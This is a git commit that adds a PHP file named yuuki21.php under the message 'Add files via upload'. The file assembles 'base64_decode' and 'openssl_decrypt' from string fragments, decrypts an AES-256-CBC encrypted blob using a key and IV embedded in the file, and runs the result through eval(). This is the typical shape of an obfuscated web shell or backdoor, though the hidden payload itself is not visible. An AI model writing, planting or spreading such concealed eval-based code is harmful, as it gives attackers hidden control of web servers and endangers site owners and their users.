53112ec33feb52c838df0b606f050afe5448a7f5
heck221 <61117745+heck221@users.noreply.github.com>
2024-04-16 22:17:24 +0700

    Add files via upload

---
+++ yuuki21.php
@@ -0,0 +1,9 @@
+<?php
+// SPLIT&ENCRYPTed
+$_bdebe6 = 'base64';$_bdebe6 .= '_';$_bdebe6 .= 'decode';$_b0d207 = 'open';$_b0d207 .= 'ssl';$_b0d207 .= '_';$_b0d207 .= 'decrypt';eval($_b0d207(
+	$_bdebe6('JJp+n8ZgbBAUEPDsKUtamQ/NGgH7afDEEFo+gEGWhGLMdeyTjPEXXdqVwWxPAbLN9pLGv5M4yBPbMxf9GIDKFgOCBfKoJqe6Fx8r0pE5GJOAYov9S9IF7OM/YMmDzYc4FU4bFPuKt+oyiwVTzDCvW80jeKv8GctxzYkUez7HVpBP2PJuZ4NslvqAyISUaYJQXSkdEp4DDjjhpUgRQJX6vMEleFWXJipyXvWa6Q61Iw0='),
+	'AES-256-CBC',
+	$_bdebe6('TgdAhWK+24tgzgXB3s/jrRa3IjCWfeAfZAt+Rym0n84='),
+	OPENSSL_RAW_DATA,
+	$_bdebe6('/6+Y7YqqZrDK2TNYm9194Q==')
+));
